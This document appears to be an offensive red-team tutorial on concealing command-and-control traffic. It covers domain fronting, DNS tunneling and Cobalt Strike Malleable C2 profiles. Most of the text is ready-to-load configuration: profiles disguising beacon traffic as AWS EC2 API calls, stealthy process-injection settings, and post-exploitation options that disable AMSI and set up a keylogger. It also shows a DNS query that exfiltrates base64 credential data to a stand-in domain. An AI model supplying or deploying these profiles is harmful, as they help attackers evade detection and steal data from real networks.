## Domain Fronting

**What is Domain Fronting?**

Domain fronting is a technique that uses Content Delivery Networks (CDNs) to hide the true destination of C2 traffic.

**How it works**:

```
1. Beacon makes HTTPS request to cdn.cloudflare.com (legitimate CDN)
2. TLS SNI (Server Name Indication): cdn.cloudflare.com
3. HTTP Host header: yourdomain.com (your actual C2)
4. CDN decrypts TLS, reads Host header
5. CDN forwards request to yourdomain.com backend
6. Response returns through CDN
```

**From defender's perspective**:
- TLS encrypted traffic to cdn.cloudflare.com (legitimate service)
- Cannot inspect Host header (inside encrypted TLS)
- Appears as normal CloudFlare/Akamai/Azure CDN traffic
- Difficult to block (would block all CDN traffic)

**Configuration Example** (Cobalt Strike):

```bash
# Malleable C2 Profile
set host_stage "false";

http-get {
set uri "/api/v1/status";

client {
header "Host" "yourdomain.com";  # Your C2 domain
header "Accept" "*/*";

metadata {
base64url;
parameter "id";
}
}

server {
header "Server" "cloudflare";
header "Content-Type" "application/json";

output {
base64url;
print;
}
}
}

http-post {
set uri "/api/v1/submit";

client {
header "Host" "yourdomain.com";
header "Content-Type" "application/json";

output {
base64url;
print;
}
}

server {
header "Server" "cloudflare";
output {
base64url;
print;
}
}
}
```

**Connect beacon through domain fronting**:
```
Beacon connects to: cdn.cloudflare.com (TLS SNI)
Host header specifies: yourdomain.com (actual C2)
CloudFlare routes to: yourdomain.com origin server
```

**Status as of 2024**:
- **CloudFlare**: Disabled domain fronting (2018)
- **Google Cloud (GCP)**: Disabled domain fronting (2018)
- **Azure CDN**: Partially mitigated
- **Amazon CloudFront**: Some configurations still work
- **Fastly**: Mitigated

**Why it was disabled**: Used by censorship circumvention tools (Signal, Tor) and threat actors.

## Malleable C2 Profiles

**What are Malleable C2 Profiles?**

Cobalt Strike's configuration language for customizing beacon behavior, network traffic patterns, and post-exploitation operations.

**Why customize?**
- Default Cobalt Strike traffic has known signatures (easily detected)
- Malleable profiles let you mimic legitimate applications
- Evade network detection and EDR

### Example: Mimicking Amazon Traffic

```c
# amazon.profile - Mimic Amazon Web Services traffic

set sample_name "Amazon AWS Profile";
set sleeptime "60000";  # 60 seconds
set jitter "20";  # 20% jitter
set useragent "aws-sdk-java/1.11.724 Linux/4.14.133-113.105.amzn2.x86_64";

set host_stage "false";  # Don't host payload on C2 server

http-get {
set uri "/ec2/api/DescribeInstances";

client {
header "Host" "ec2.amazonaws.com";
header "Accept" "application/json";
header "X-Amz-Date" "20240115T153045Z";

metadata {
base64url;
prepend "Action=DescribeInstances&Version=2016-11-15&InstanceId=";
header "Cookie";
}
}

server {
header "Server" "AmazonEC2";
header "Content-Type" "application/json";
header "X-Amzn-RequestId" "a1b2c3d4-e5f6-7890-abcd-ef1234567890";

output {
base64url;
prepend "{\"Instances\":[{\"InstanceId\":\"";
append "\"}]}";
print;
}
}
}

http-post {
set uri "/ec2/api/RunInstances";

client {
header "Host" "ec2.amazonaws.com";
header "Content-Type" "application/x-www-form-urlencoded";
header "X-Amz-Date" "20240115T153045Z";

output {
base64url;
prepend "Action=RunInstances&ImageId=";
append "&InstanceType=t2.micro";
print;
}
}

server {
header "Server" "AmazonEC2";
header "X-Amzn-RequestId" "b2c3d4e5-f6a7-8901-bcde-fg2345678901";

output {
base64url;
prepend "{\"InstanceId\":\"";
append "\"}";
print;
}
}
}

http-stager {
set uri_x86 "/ec2/ami/ami-12345678";
set uri_x64 "/ec2/ami/ami-abcdefgh";

client {
header "Host" "ec2.amazonaws.com";
header "Accept" "application/octet-stream";
}

server {
header "Server" "AmazonEC2";
header "Content-Type" "application/octet-stream";

output {
print;
}
}
}
```

**What this profile does**:
- URIs mimic EC2 API endpoints
- Headers match real AWS SDK requests
- Metadata hidden in fake EC2 parameters
- Responses formatted as JSON (look like real EC2 responses)

**Load profile in Cobalt Strike**:
```bash
./teamserver 10.0.0.5 password /path/to/amazon.profile
```bash

### Process Injection Customization

```c
process-inject {
set allocator "VirtualAllocEx";  # Memory allocation method
set min_alloc "16384";  # Minimum allocation size
set startrwx "false";  # Don't start with RWX (stealthier)
set userwx "false";  # Don't use RWX (use RX instead)

transform-x86 {
prepend "\x90\x90\x90";  # NOP sled
}

transform-x64 {
prepend "\x90\x90\x90\x90\x90\x90";  # NOP sled
}

execute {
CreateThread "ntdll.dll!RtlUserThreadStart";
SetThreadContext;
NtQueueApcThread-s;  # Stealthier injection
CreateRemoteThread;
RtlCreateUserThread;
}
}
```bash

### Post-Exploitation OPSEC

```c
post-ex {
set spawnto_x86 "%windir%\\syswow64\\werfault.exe";
set spawnto_x64 "%windir%\\system32\\werfault.exe";

set obfuscate "true";  # Obfuscate post-ex DLLs
set smartinject "true";  # Check process before injecting
set amsi_disable "true";  # Disable AMSI (Windows 10+)
set pipename "wkssvc##";  # Named pipe pattern
set keylogger "GetAsyncKeyState";  # Keylogger API
}
```bash

## DNS Tunneling for C2

**When to use DNS**:
- HTTP/HTTPS blocked or heavily inspected
- Need covert channel
- Slow bandwidth acceptable

**How DNS C2 works**:

```
1. Beacon encodes data in DNS subdomain:
YWRtaW4ucGFzc3dvcmQ.yourdomain.com

2. DNS query sent to your authoritative nameserver:
dig YWRtaW4ucGFzc3dvcmQ.yourdomain.com

3. C2 server extracts data from subdomain (base64 decode)
4. C2 responds with TXT record containing encoded command
5. Beacon executes command, exfiltrates via DNS queries
```

**Cobalt Strike DNS Listener**:

```
Payload: windows/beacon_dns/reverse_dns_txt
Host: yourdomain.com
Beacon: DNS TXT Record
```

**DNS Beacon Traffic**:
```
;; QUESTION SECTION:
;aGVsbG8gd29ybGQ.yourdomain.com. IN TXT

;; ANSWER SECTION:
command: ZWNobyAiaGVsbG8i (base64: echo "hello")
```

**Advantages**:
- DNS rarely blocked
- No TLS inspection issues
- Works through proxies

**Disadvantages**:
- Slow (few KB/s)
- High latency
- Easier to detect with DNS analytics

